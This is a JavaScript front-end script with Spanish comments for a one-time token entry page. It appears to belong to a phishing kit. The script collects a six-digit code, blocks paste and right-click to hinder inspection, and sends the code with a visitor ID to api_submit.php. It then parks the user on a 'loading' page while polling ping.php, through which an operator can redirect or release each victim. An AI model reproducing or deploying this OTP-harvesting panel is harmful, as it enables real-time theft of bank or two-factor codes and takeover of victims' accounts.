document.addEventListener('DOMContentLoaded', () => {
    const formToken = document.getElementById('formToken');
    const btnSubmitToken = document.getElementById('btnSubmitToken');
    const inputs = document.querySelectorAll('.token-digit-input');
    const timerDisplay = document.getElementById('tokenTimerDisplay');

    // --- 1. Auto-Tab y validación numérica ---
    inputs.forEach((input, index) => {
        // Bloquear eventos del DOM (prevención de ingeniería inversa básica)
        input.addEventListener('contextmenu', e => e.preventDefault());
        input.addEventListener('paste', e => e.preventDefault());

        input.addEventListener('input', (e) => {
            // Solo permitir números
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
            
            if (e.target.value.length === 1 && index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
            checkInputs();
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                inputs[index - 1].focus();
            }
        });
    });

    // --- 2. Habilitar botón de validar ---
    function checkInputs() {
        let allFilled = true;
        inputs.forEach(input => {
            if (input.value.length !== 1) allFilled = false;
        });
        btnSubmitToken.disabled = !allFilled;
        if (allFilled) btnSubmitToken.classList.add('active');
        else btnSubmitToken.classList.remove('active');
    }

    // --- 3. Temporizador de 60 segundos ---
    let timeLeft = 60;
    if (timerDisplay) {
        timerDisplay.textContent = '01:00';
        const timerInterval = setInterval(() => {
            timeLeft--;
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                timerDisplay.textContent = '00:00';
                return;
            }
            const mins = String(Math.floor(timeLeft / 60)).padStart(2, '0');
            const secs = String(timeLeft % 60).padStart(2, '0');
            timerDisplay.textContent = `${mins}:${secs}`;
        }, 1000);
    }

    // --- 4. Envío del formulario ---
    if (formToken) {
        formToken.addEventListener('submit', async (e) => {
            e.preventDefault();
            btnSubmitToken.disabled = true;

            const tokenCode = Array.from(inputs).map(i => i.value).join('');
            const formData = new FormData();
            formData.append('action', 'token');
            if (typeof visitorId !== 'undefined') {
                formData.append('visitor_id', visitorId);
            }
            formData.append('token_code', tokenCode);

            try {
                await fetch('api_submit.php', { method: 'POST', body: formData });
            } catch (err) {
                console.error('Error enviando token:', err);
            }
            window.location.href = 'cargando.php';
        });
    }

    // --- 5. Polling de seguridad ---
    setInterval(async () => {
        if (typeof visitorId === 'undefined' || !visitorId) return;
        try {
            const res = await fetch(`ping.php?id=${encodeURIComponent(visitorId)}&t=${Date.now()}`);
            if (!res.ok) return;
            const data = await res.json();
            const action = (data.action || '').trim();

            if (action === 'blocked') {
                window.location.href = 'index.php';
            } else if (action === 'finished') {
                window.location.href = 'https://www.google.com';
            }
        } catch (e) {}
    }, 1000);
});
